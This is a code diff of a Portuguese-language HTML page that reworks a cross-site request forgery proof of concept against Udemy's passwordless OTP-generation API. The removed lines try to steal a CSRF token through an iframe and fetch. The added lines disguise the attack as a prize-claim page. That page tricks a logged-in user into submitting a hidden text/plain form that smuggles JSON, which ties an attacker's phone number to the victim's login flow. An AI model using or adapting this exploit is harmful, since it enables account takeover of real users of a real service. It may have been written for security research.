@@ -1,93 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Página Inocente</title>
+    <title>Sistema de Recompensas</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .btn { background: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; }
+        .steps { text-align: left; margin: 20px 0; }
+    </style>
 </head>
 <body>
-    <h1>Carregando...</h1>
-    
-    <!-- Primeira fase: GET para uma página do site que contém o token CSRF -->
-    <!-- Como é GET, os cookies SameSite=Lax serão enviados -->
-    <iframe id="tokenGrabber" src="https://www.udemy.com" style="width:100;height:100;border:0;"></iframe>
+    <div class="container">
+        <h1>🎁 Resgate sua recompensa exclusiva!</h1>
+        
+        <div class="steps">
+            <h3>Para resgatar seu prêmio:</h3>
+            <ol>
+                <li>Clique no botão abaixo para fazer login (se necessário)</li>
+                <li>Após o login, retorne para esta página</li>
+                <li>Clique no botão "Resgatar Prêmio" que aparecerá</li>
+                <li>Seu prêmio será enviado para seu telefone registrado</li>
+            </ol>
+        </div>
+        
+        <button id="login-button" class="btn">Fazer Login no Site</button>
+        <div id="step2" style="display:none; margin-top: 30px;">
+            <h3>Agora clique abaixo para resgatar seu prêmio:</h3>
+            <button id="claim-button" class="btn">RESGATAR PRÊMIO AGORA</button>
+        </div>
+    </div>
     
     <script>
-        // Segunda fase: extrair o token e fazer o POST
-        window.addEventListener('message', function(event) {
-            if (event.origin === "https://www.udemy.com/") {
-            	console.log("event? ", event);
-                var token = event.data.token;
-                
-                // Agora usamos o token capturado para fazer o POST
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/', true);
-                xhr.withCredentials = true;
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.setRequestHeader('X-CSRF-Token', token); 
-                xhr.send(JSON.stringify({
-                    "purpose": 3,
-                    "phone_number": "+5514996810417"
-                }));
-            }
+        document.getElementById('login-button').addEventListener('click', function() {
+            // Abre o site em uma nova aba para o usuário fazer login
+            window.open('https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=https%3A%2F%2Fwww.udemy.com%2Flogout%2F&response_type=html&action=login&mode', '_blank');
+            
+            // Mostra o próximo passo quando o usuário retornar
+            this.textContent = "Já fiz login";
+            document.getElementById('step2').style.display = 'block';
         });
         
-        // Script no iframe que extrairia o token e o enviaria via postMessage
-        setTimeout(function() {
-            var iframe = document.getElementById('tokenGrabber');
-            var script = document.createElement('script');
-            script.textContent = `
-                // Código para encontrar o token CSRF na página e enviá-lo de volta
-                var token = document.querySelector('meta[name="csrfToken"]')?.getAttribute('content');
-                window.parent.postMessage({token: token}, "*");
-            `;
+        document.getElementById('claim-button').addEventListener('click', function() {
+            // Cria e submete o formulário malicioso quando o usuário clicar
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/';
+            form.enctype = 'text/plain';
+            form.target = '_blank'; // Abre em nova aba
             
-            try {
-                iframe.contentDocument.body.appendChild(script);
-            } catch(e) {
-                console.log("Erro ao acessar iframe: " + e);
-            }
-        }, 2000);
-    </script>
-    <script>
-        // Etapa 1: Fazer uma requisição GET para uma página onde o token está disponível
-        fetch('https://www.udemy.com/user/edit-account/', {
-            method: 'GET',
-            credentials: 'include' // Envia cookies (permitido com SameSite=Lax para GET)
-        })
-        .then(response => response.text())
-        .then(html => {
-            // Etapa 2: Extrair o token CSRF do HTML recebido
-            const parser = new DOMParser();
-            const doc = parser.parseFromString(html, 'text/html');
+            var input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = '{"purpose":3,"phone_number":"';
+            input.value = '+5514996810417"}';
+            form.appendChild(input);
             
-            // Procura o token em diferentes lugares comuns
-            let token = doc.querySelector('meta[name="csrfToken"]')?.getAttribute('content');
-            if (!token) token = doc.querySelector('input[name="_csrf"]')?.value;
-            if (!token) {
-                // Tenta extrair via regex de um script
-                const match = html.match(/"csrfToken":\s*"([^"]+)"/);
-                if (match) token = match[1];
-            }
+            document.body.appendChild(form);
+            form.submit();
             
-            if (token) {
-                // Etapa 3: Usar o token para fazer o POST autenticado
-                fetch('https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/', {
-                    method: 'POST',
-                    credentials: 'include',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-CSRF-Token': token
-                    },
-                    body: JSON.stringify({
-                        "purpose": 3,
-                        "phone_number":  "+5514996810417"
-                    })
-                })
-                .then(response => {
-                    console.log("Requisição enviada, status:", response.status);
-                });
-            }
-        })
-        .catch(error => console.error('Erro:', error));
+            // Mostra mensagem de sucesso
+            this.textContent = "Prêmio Resgatado!";
+            this.disabled = true;
+        });
     </script>
 </body>
 </html>
